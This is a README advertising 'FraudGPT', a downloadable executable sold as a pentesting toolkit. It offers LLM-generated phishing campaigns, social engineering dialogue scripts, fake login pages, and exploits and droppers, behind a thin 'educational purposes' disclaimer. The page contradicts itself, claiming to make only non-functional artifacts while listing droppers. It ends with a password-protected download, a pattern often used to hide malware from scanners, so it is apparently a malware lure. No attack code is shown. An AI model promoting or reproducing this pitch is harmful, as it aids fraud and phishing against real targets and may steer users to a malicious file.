# <p align="center">🕵️ FraudGPT: Portable Pentesting Software</p>

![photo_2026-02-25_23-38-06](https://github.com/user-attachments/assets/cae5ba1c-5948-430b-80e2-7f1f5f6e2198)

---

## ⚠️ Disclaimer

This software is intended **strictly for educational and research purposes**. The developer **doesn"t** support or encourage illegal activity and assumes no responsibility for any misuse or violations of the law.

---

## 🧐 What Is FraudGPT?

**FraudGPT** is a portable attack simulation toolkit powered by large language models. It was created as a controlled environment where cybersecurity professionals can safely simulate modern social engineering and phishing-based attack scenarios without relying on real threat actors or underground tools.

The project demonstrates how AI can be leveraged to automate:

- Phishing campaigns  
- Social engineering scenarios  
- Malicious code prototypes  

Its primary objective is to provide cybersecurity professionals with a realistic testing environment that closely replicates modern threat techniques.

---

## 🚀 Core Modules and Menu Overview

### 📧 Campaign Studio

The **Campaign Studio** is more than just a phishing email generator. It functions as a scenario engine where users define the target profile, business context, urgency level, and communication style. 

For example, a red team might simulate a quarter-end financial audit scenario targeting a company’s accounting department. The tool can automatically generate a series of staged emails: an initial notification, a follow-up reminder, and a final escalation notice. Each message evolves in tone — from polite and professional to urgent and time-sensitive — mimicking real-world attack progression.

What makes this module unique is its contextual memory. If you define a fictional CFO, company domain, and internal terminology at the beginning of a session, the system consistently applies those details across all generated materials. The result feels less like a template and more like a coordinated campaign.

Security teams often use this module to test:
- Email filtering systems  
- Employee awareness  
- Incident reporting workflows  
- SOC response times  

All generated content is clearly marked for simulation purposes, ensuring it remains within a controlled environment.

---

### 💬 Social Engineering Lab

The **Social Engineering Lab** focuses on conversational attack simulation. Rather than generating single messages, it models dialogue flows: phone pretexts, chat-based impersonation, or helpdesk manipulation attempts.

Imagine a scenario where a red team wants to test password reset procedures. Instead of simply asking, “Would an employee share credentials?”, FraudGPT can generate a full conversation script where the attacker gradually builds rapport, references believable internal processes, and introduces subtle pressure tactics.

The value of this module lies in its psychological layering. It allows defenders to analyze how authority bias, urgency cues, and trust signals are used in staged scenarios. Trainers can replay these scripts in tabletop exercises, role-playing sessions, or awareness workshops.

Over time, organizations begin to notice patterns — not just in employee mistakes, but in procedural weaknesses that attackers exploit.

---

### 🌐 Web Emulation Workspace

The **Web Emulation Workspace** is designed to simulate how fraudulent landing pages might look and behave — purely for detection and defensive testing. 

Instead of cloning real services, the module generates structurally realistic but fictional login portals or data capture pages. These mock pages can be used to evaluate:
- Web filtering tools  
- Browser protection mechanisms  
- Endpoint detection systems  
- User recognition of suspicious UI elements  

A common use case involves embedding subtle visual inconsistencies — slight domain variations, minor branding shifts, or misplaced legal disclaimers — to test whether users notice red flags.

Security teams often integrate these simulations into internal awareness campaigns, later revealing the indicators that should have raised suspicion.

---

### 🧬 Exploit Simulation & Artifact Generator

This module does not create operational malware. Instead, it produces **safe, non-functional proof-of-concept artifacts** designed to test detection logic and response workflows.

For example, it can generate:
- Harmless script stubs with suspicious patterns  
- Encoded payload placeholders  
- Mock droppers that trigger EDR alerts without executing malicious actions  

The purpose is to evaluate whether monitoring systems react appropriately to suspicious structures, naming conventions, or behavioral indicators.

In one documented internal exercise, a security team discovered that their EDR ignored certain obfuscated script patterns simply because they had never encountered that format before. The simulation allowed them to patch a blind spot before it was exploited in the wild.

---

### 🔍 Vulnerability & Exposure Analyzer

This analytical component allows teams to describe their infrastructure at a high level and explore hypothetical attack paths.

For instance, a user might describe:
- A hybrid cloud environment  
- Remote VPN access  
- Email-based MFA  
- Legacy on-premise file servers  

FraudGPT can then outline theoretical exposure chains, not as a hacking manual, but as a risk visualization tool. It narratively connects misconfigurations and human factors into potential escalation paths, helping defenders think like adversaries without crossing ethical lines.

This feature is particularly valuable during risk assessment workshops and strategic security planning.


---

## 🚀 Key Features

- 📧 Automated phishing email generation  
- 💬 Social engineering script creation  
- 🧬 Proof-of-concept exploits and droppers  
- 🌐 Fraudulent website emulation  
- 🔍 Vulnerability analysis tools  
- ...and more, much more...

---

![photo_2026-02-26_00-39-07](https://github.com/user-attachments/assets/ee2af936-fde2-46a1-a027-704fe997b1a8)

## 🎁 Designed for Practical Use

### ✅ Standalone Executable — Maximum Simplicity

- No Python installation required  
- No dependency management or virtual environments  
- Fully portable  
- Does not modify the system registry  
- No administrator privileges needed

FraudGPT is distributed as a standalone executable to eliminate friction during deployment. It does not require Python installations, dependency management, or administrative privileges.

The toolkit includes a lightweight local language model engine, allowing fully offline operation for sensitive environments. For teams that require enhanced language capabilities, optional API integration with external LLM providers is available.

All generated outputs can be exported in `.txt`, `.json`, or `.html` formats, making them easy to integrate into:

- Penetration testing reports  
- Security awareness presentations  
- Compliance documentation  
- Internal research archives  

---

### ✅ Intuitive Interface

- Clean, user-friendly UI  
- Clear operational flags and controls  
- Quick setup and execution  

---

### ✅ Offline Capability

- Built-in lightweight LLM (based on `llama.cpp`) for complete offline functionality  
- Optional API integration with OpenAI, Claude, or local models  

---

### ✅ Instant Export Options

- Save generated results in `.txt`, `.json`, or `.html` formats  
- Easily integrate outputs into penetration testing reports or training materials  

---

## 📈 Ideal for Cybersecurity Professionals

### 🔬 Know Your Enemy (KYE)

Understand how modern threat actors operate by safely simulating their techniques in a controlled environment.

### 🎓 Employee Security Training

- Generate dozens of unique phishing emails in seconds  
- Test employee awareness  
- Identify weak points and reinforce training  

### 🛡️ Security Control Testing

- Run generated emails through corporate anti-spam systems  
- Detect filtering weaknesses before attackers exploit them  

---

## ⚙️ Installation Guide

1. Download the latest release archive on the "Releases"
2. Extract the archive contents  
3. Launch the application

## Password: <ins>4jf7s59HFsgc</ins>

---

### **❗ CHECK THE "HELP" TAB ON THE PROGRAM BEFORE ASK QUESTIONS ❗**

> Built for research, testing, and strengthening defensive security capabilities.
